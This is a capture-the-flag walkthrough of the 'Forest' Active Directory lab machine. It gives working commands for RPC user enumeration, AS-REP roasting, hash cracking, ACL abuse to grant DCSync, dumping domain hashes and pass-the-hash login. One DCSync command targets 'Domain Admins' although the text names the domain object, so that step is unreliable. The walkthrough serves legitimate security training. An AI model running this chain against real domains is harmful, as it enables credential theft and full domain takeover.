#Windows #ActiveDirectory #RPC #ASREPRoast #hashcat #BloodHound #DCSync #secretsdump #WinRM #ACLAbuse

## Overview

Forest is an easy but iconic Active Directory box that teaches the canonical attack path: enumerate users over RPC, **AS-REP roast** an account that doesn't require Kerberos pre-authentication, crack it, then use **BloodHound** to find an ACL chain that ends in **DCSync**. Dumping the domain hashes and passing the Administrator hash finishes it. If you learn one AD box, it's this one.

> **Screenshot would help here:** the pivot is reading BloodHound's "Shortest Path to Domain Admins" graph. A screenshot of that graph, svc-alfresco → Account Operators → Exchange Windows Permissions → DCSync, would convey the privesc logic far better than text.

## Recon

SMB null sessions gave nothing, so I moved to RPC, which allowed an anonymous bind and full user/group enumeration:

```sh
rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
... svc-alfresco ... sebastien ... lucinda ... andy ... mark ...
```

> **Why RPC first:** an anonymous RPC bind on a DC frequently leaks the entire user list even when SMB shares are locked down. That list is the raw material for AS-REP roasting and password spraying.

## Foothold

### AS-REP Roasting svc-alfresco

I asked the KDC for AS-REP tickets for every user, with no password:

```sh
for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user}; done
```

Only `svc-alfresco` returned a hash:

```
$krb5asrep$23$svc-alfresco@HTB:‹redacted›
```

> **What AS-REP roasting is:** normally Kerberos requires *pre-authentication*, you prove you know the password before the KDC sends anything crackable. If an account has "Do not require Kerberos preauthentication" set, the KDC will hand out an AS-REP encrypted with that account's password hash to *anyone who asks*. That's an offline-crackable blob requiring zero credentials.

hashcat cracked it (mode 18200):

```sh
hashcat -m 18200 svc-alfresco.kerb rockyou.txt
->  svc-alfresco : ‹redacted›
```

Those credentials gave a WinRM shell.

## Privilege Escalation

### BloodHound → ACL Chain → DCSync

I ran SharpHound and pulled the data into BloodHound. The shortest path to Domain Admins was an ACL chain:

> `svc-alfresco` → **Account Operators** → **GenericAll** on the **Exchange Windows Permissions** group → that group holds **WriteDacl** on the domain object → grant myself **DCSync**.

The "Exchange Windows Permissions" group can modify the domain's DACL, which lets me give my own account replication (DCSync) rights. First I added myself to the group, then granted DCSync:

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add /domain
Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

> **What DCSync does:** replication rights let an account ask the DC to "replicate" account secrets, effectively the same request a backup DC makes. With it, `secretsdump` pulls every hash in the domain, including the KRBTGT and Administrator, without ever touching the DC's disk.

```sh
impacket-secretsdump svc-alfresco@10.10.10.161
htb.local\Administrator:500:aad3b435...:‹redacted›:::
```

## Root

Pass-the-hash as Administrator:

```sh
evil-winrm -i 10.10.10.161 -u administrator -H ‹redacted›
C:\>whoami
htb\administrator
```

Box rooted.

## Takeaways

- **Anonymous RPC enumeration** seeds the whole attack, get the user list first.
- **AS-REP roasting needs no credentials**; any account missing pre-auth is free offline cracking.
- **BloodHound turns ACLs into attack paths.** The Account Operators → Exchange Windows Permissions → DCSync chain is a well-known route from a low-priv user to full domain compromise.
- **DCSync = game over.** Replication rights dump every hash; pass-the-hash then logs in as Administrator.
